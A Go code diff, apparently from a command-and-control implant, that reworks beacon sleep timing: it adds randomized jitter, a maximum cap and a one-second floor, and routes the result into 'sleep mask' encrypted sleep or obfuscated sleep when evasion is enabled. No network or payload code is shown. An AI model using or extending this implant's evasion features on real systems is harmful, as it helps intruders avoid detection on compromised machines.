@@ -96,18 +96,28 @@ func sleepWithJitter() {
 	}
 	base := time.Duration(baseInterval) * time.Second
 	jit := float64(Jitter) / 100.0
-	variation := time.Duration(float64(base) * jit * (rng.Float64()*2 - 1))
+
+	// Use enhanced randomization if configured
+	nextInterval := computeBeaconIntervalWithMode(base, jit)
+
+	// Apply max random cap if configured
+	nextInterval = applyMaxRandomCap(nextInterval)
+
+	// Bound from below: a symmetric distribution can push a beacon near-or-below
+	// zero, which the sleep helpers treat as "return now" — a self-inflicted
+	// beacon storm. Floor at 1s (>= 10% of base for long cadences).
+	nextInterval = floorBeaconInterval(base, nextInterval)
 
 	// If Sleep Mask is initialized, use encrypted sleep
 	if sleepMaskActive {
-		sleepWithMask(base + variation)
+		sleepWithMask(nextInterval)
 		return
 	}
 	if evasionEnabled {
-		sleepObfuscated(base + variation)
+		sleepObfuscated(nextInterval)
 		return
 	}
-	waitForBeaconWake(base + variation)
+	waitForBeaconWake(nextInterval)
 }
 
 func waitForBeaconWake(duration time.Duration) {
